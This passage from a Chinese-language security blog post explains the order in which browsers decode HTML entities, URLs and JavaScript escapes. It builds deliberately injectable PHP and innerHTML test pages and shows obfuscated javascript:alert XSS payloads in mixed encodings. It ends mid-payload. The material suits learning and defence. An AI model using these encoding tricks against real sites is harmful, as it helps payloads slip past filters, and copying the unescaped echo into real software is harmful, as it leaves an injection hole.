<p>比如<code>&lt;a href=&quot;javascript:alert(&#39;&lt;\u4e00&gt;&#39;)&quot;&gt;test&lt;/a&gt;</code>，javascript 会触发JS 解释器，JS会先对内容进行解析，里边有一个转义字符<code>\u4e00</code>，前导的 \u 表示他是一个unicode 字符，根据后边的数字，解析为<code>一</code>，于是在完成JS的解析之后变成了：<code>href=&quot;javascript:alert(&#39;&lt;一&gt;&#39;)&quot;&gt;test</code></p>
<h2 id="解码全流程分析"><a href="#解码全流程分析" class="headerlink" title="解码全流程分析"></a>解码全流程分析</h2><p>以该<code>test_get.php</code>文件为例</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&lt;?php echo $_GET[&#x27;input&#x27;];?&gt;&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>场景，就是一个<code>&lt;a href=&quot;&lt;?php echo $_GET[&#39;input&#39;];?&gt;&quot;&gt;test&lt;/a&gt;</code>的语句，测试XSS体会解码过程。准备原始payload：<code>javascript:alert(&#39;&lt;-&gt;&#39;);</code>，将<code>-</code>经过unicode编码，<code>&lt;&gt;</code>经过html实体化编码，再最后整体进行url编码后，通过浏览器传参<code>?input=javascript%3Aalert(%27%26lt%3B%5Cu4e00%26gt%3B%27)%3B</code></p>
<p>先看效果，成功弹窗</p>
<p><img src="/./images/20250621_1354328769.png"></p>
<ol>
<li>首先经过浏览器URL解码，得到<code>javascript:alert(&#39;&amp;lt;\u4e00&amp;gt;&#39;);</code></li>
<li><font style="color:rgb(77, 77, 77);">html解析器构建DOM节点，并进行html实体化解码得到</font><code>&lt;font style=&quot;color:rgb(77, 77, 77);&quot;&gt;javascript:alert(&#39;&lt;\u4e00&gt;&#39;);&lt;/font&gt;</code></li>
<li>最后经过JS解析器得到<code>&lt;font style=&quot;color:rgb(77, 77, 77);&quot;&gt;javascript:alert(&#39;&lt;-&gt;&#39;);&lt;/font&gt;</code></li>
</ol>
<p>传入<code>?input=javascript:alert(&#39;&amp;lt;\u4e00&amp;gt;&#39;);</code>，不行，查看html为<code>&lt;a href=&quot;javascript:alert(&#39;&quot;&gt;test&lt;/a&gt;</code>，alert后面少了一截，<strong>这是为什么呢？</strong></p>
<p><strong>原因：&amp;符号在URL传参中是分隔符，所以隔断了。太憨了，这都没想起来。</strong></p>
<p><img src="/./images/20250621_1354328115.png"></p>
<p><code>javascript:alert(&#39;%26lt%5cu4e00%26gt&#39;);</code>可以</p>
<p><img src="/./images/20250621_1354328339.png"></p>
<h2 id="解析顺序"><a href="#解析顺序" class="headerlink" title="解析顺序"></a>解析顺序</h2><p>在不考虑最初传参涉及的url解码的情况下，当浏览器获得一段内容后，触发<strong>HTML解析器</strong>来对这篇文档进行词法解析。在这一步中字符引用被解码。在词法解析完成后，DOM树就被创建好了，<strong>JavaScript解析器</strong>会介入来对内联脚本进行解析。在这一步中Unicode转义序列和Hex转义序列被解码。同时，如果浏览器遇到需要<strong>URL的上下文，URL解析器也会介入来解码URL内容</strong>。在这一步中URL解码操作被完成。</p>
<p><strong>由于URL位置不同，URL解析器可能会在JavaScript解析器之前或之后进行解析</strong>。</p>
<p>考虑如下两种情况</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Example A: <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;UserInput&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">Example B: <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span>   <span class="attr">onclick</span>=<span class="string">&quot;window.open(&#x27;UserInput&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>在例A中，HTML解析器将首先开始工作，并对UserInput中的字符引用进行解码。然后URL解析器开始对href值进行URL解码。最后，如果URL资源类型是JavaScript，那么JavaScript解析器会进行Unicode转义序列和Hex转义序列的解码。再之后，解码的脚本会被执行。因此，这里涉及三轮解码，顺序是HTML，URL和JavaScript。</p>
<p>在例B中，HTML解析器首先工作。然而接下来，JavaScript解析器开始解析在onclick事件处理器中的值。这是因为在onclick事件处理器中是script的上下文。当这段JavaScript被解析并被执行的时候，它执行的是“window.open()”操作，其中的参数是URL的上下文。在此时，URL解析器开始对UserInput进行URL解码并把结果回传给JavaScript引擎。因此这里一共涉及三轮解码，顺序是HTML，JavaScript和URL。</p>
<p>最后的例子</p>
<p><code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;/a&gt;</code></p>
<h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><h3 id="URL编码范围"><a href="#URL编码范围" class="headerlink" title="URL编码范围"></a>URL编码范围</h3><p>问题来了，既然浏览器会对<code>href</code>的里面的链接做一次URL解码，是否可以对<code>href</code>里面的内容整体做一次URL编码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">对href里面的javascript:alert(&#x27;xss&#x27;)做一次URL编码：</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%27%78%73%73%27%29&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>前者正常弹窗，后者没能正常解码</p>
<p><img src="/./images/20250621_1354323899.png"></p>
<p><img src="/./images/20250621_1354337189.png"></p>
<p>结果表示这样并不可行，这里就有一个URL解析过程中的一个细节了，<strong>不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型</strong>，就导致上面DOM节点中被编码的“javascript”没有解码，当然不会被URL解析器识别了。就比如说<code>http://www.baidu.com</code>可以被编码为<code>http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code>，但是不能把协议也编码了：<code>%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code></p>
<h3 id="JS编码范围"><a href="#JS编码范围" class="headerlink" title="JS编码范围"></a>JS编码范围</h3><p>对于刚才JS编码时，我们只编码了<code>alert(&#39;xss&#39;)</code>中的<code>alert</code>，这里我们能不能一起都编码呢？答案是不能。在进行JavaScript解析的时候字符或者字符串<strong>仅会被解码为字符串文本或者标识符名称</strong>，在上例中Javascript解析器工作的时候将<code>\u0061\u006c\u0065\u0072\u0074</code>进行解码后为<code>alert</code>，而<code>alert</code>是一个有效的标识符名称，它是能被正常解析的。像圆括号、双引号、单引号等等这些字符就只能被当作普通的文本，从而导致无法执行，比如<code>&lt;script&gt;alert(&#39;aaa\u0027)&lt;/script&gt;</code>解析后缺少闭合的单引号而无法执行成功。</p>
<p>如果对alert进行JS编码</p>
<p>结果：<script>\u0061\u006c\u0065\u0072\u0074(1)</script></p>
<p><strong>注意：</strong>这里是不能对alert(1)进行HTML编码的，<strong>因为HTML解析时发现这个DOM节点是script，会调用JS解析来解析其中的内容</strong>。可以用下面这种方式</p>
<p><code>&lt;svg&gt;&lt;script&gt;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;&lt;/script&gt;</code></p>
<p><img src="/./images/20250621_1354334048.png"><br> <img src="/./images/20250621_1354332940.png"></p>
<h1 id="编码靶场模拟"><a href="#编码靶场模拟" class="headerlink" title="编码靶场模拟"></a>编码靶场模拟</h1><h2 id="HTML实体编码-1"><a href="#HTML实体编码-1" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML 实体自动解码测试（innerHTML）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;input&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入 HTML 实体编码（如 <span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span>...）&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;insertEntity()&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;output&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">insertEntity</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> input = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;input&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 使用 innerHTML 动态插入包含实体的 HTML 内容</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;output&#x27;</span>).<span class="property">innerHTML</span> = </span></span><br><span class="line"><span class="language-javascript">                <span class="string">`&lt;a href=&quot;<span class="subst">$&#123;input&#125;</span>&quot;&gt;点击测试动态实体&lt;/a&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/./images/20250621_1354338173.png">将<code>javascript:alert(&#39;xss&#39;)</code>转化为HTML实体，因为解析HTML之后，建立起<code>&lt;a&gt;</code>DOM节点，然后对DOM节点里面的HTML实体进行解析。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6c;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x29;</span>&quot;&gt;test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p> <img src="/./images/20250621_1354341477.png"></p>
<h2 id="Javascript编码"><a href="#Javascript编码" class="headerlink" title="Javascript编码"></a>Javascript编码</h2><p><img src="/./images/20250621_1354341503.png"></p>
<p>对<code>alert</code>做JS编码，因为当HTML打算对<code>&lt;a&gt;</code>DOM节点进行<strong>HTML实体解析时</strong>，<strong>发现URL资源类型为Javascript</strong>，因此会<strong>调用JS解析器</strong>来对JS代码进行解析</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:\u0061\u006c\u0065\u0072\u0074(&#x27;xss&#x27;)</span><br></pre></td></tr></table></figure>

<h2 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h2><p>也可以根据浏览器的解码顺序实行混合编码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 原代码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">2. 对alert进行JS编码（unicode编码）</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(&#x27;xss&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">3. 对href标签中的\u0061\u006c\u0065\u0072\u0074进行URL编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(&#x27;xss&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">4. 对href标签中的javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(&#x27;xss&#x27;)进行HTML编码：</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x32;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x34;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x29;</span>&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p> 均可弹窗</p>
<p><img src="/./images/20250621_1354348070.png"></p>
<h2 id="几种场景分析"><a href="#几种场景分析" class="headerlink" title="几种场景分析"></a><strong><font style="color:rgb(35, 38, 59);">几种场景分析</font></strong></h2><h3 id="场景一-GET"><a href="#场景一-GET" class="headerlink" title="场景一 GET"></a>场景一 GET</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&lt;?php echo $_GET[&#x27;input&#x27;];?&gt;&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x32;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x34;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x29;</span></span><br></pre></td></tr></table></figure>

<p>无法弹窗。只剩一个&amp;符号，说明首先第一次URL解码出现问题了。</p>
<p><img src="/./images/20250621_1354354595.png"></p>
<p><font style="color:rgba(0, 0, 0, 0.85);">在浏览器中，当你通过 URL 传递参数时，浏览器会对 URL 进行解析和处理。</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&amp;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);">符号是传参连接符，这样就截断了。</font></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%26%23x6a%3B%26%23x61%3B%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x25%3B%26%23x35%3B%26%23x63%3B%26%23x25%3B%26%23x37%3B%26%23x35%3B%26%23x25%3B%26%23x33%3B%26%23x30%3B%26%23x25%3B%26%23x33%3B%26%23x30%3B%26%23x25%3B%26%23x33%3B%26%23x36%3B%26%23x25%3B%26%23x33%3B%26%23x31%3B%26%23x25%3B%26%23x35%3B%26%23x63%3B%26%23x25%3B%26%23x37%3B%26%23x35%3B%26%23x25%3B%26%23x33%3B%26%23x30%3B%26%23x25%3B%26%23x33%3B%26%23x30%3B%26%23x25%3B%26%23x33%3B%26%23x36%3B%26%23x25%3B%26%23x36%3B%26%23x33%3B%26%23x25%3B%26%23x35%3B%26%23x63%3B%26%23x25%3B%26%23x37%3B%26%23x35%3B%26%23x25%3B%26%23x33%3B%26%23x30%3B%26%23x25%3B%26%23x33%3B%26%23x30%3B%26%23x25%3B%26%23x33%3B%26%23x36%3B%26%23x25%3B%26%23x33%3B%26%23x35%3B%26%23x25%3B%26%23x35%3B%26%23x63%3B%26%23x25%3B%26%23x37%3B%26%23x35%3B%26%23x25%3B%26%23x33%3B%26%23x30%3B%26%23x25%3B%26%23x33%3B%26%23x30%3B%26%23x25%3B%26%23x33%3B%26%23x37%3B%26%23x25%3B%26%23x33%3B%26%23x32%3B%26%23x25%3B%26%23x35%3B%26%23x63%3B%26%23x25%3B%26%23x37%3B%26%23x35%3B%26%23x25%3B%26%23x33%3B%26%23x30%3B%26%23x25%3B%26%23x33%3B%26%23x30%3B%26%23x25%3B%26%23x33%3B%26%23x37%3B%26%23x25%3B%26%23x33%3B%26%23x34%3B%26%23x28%3B%26%23x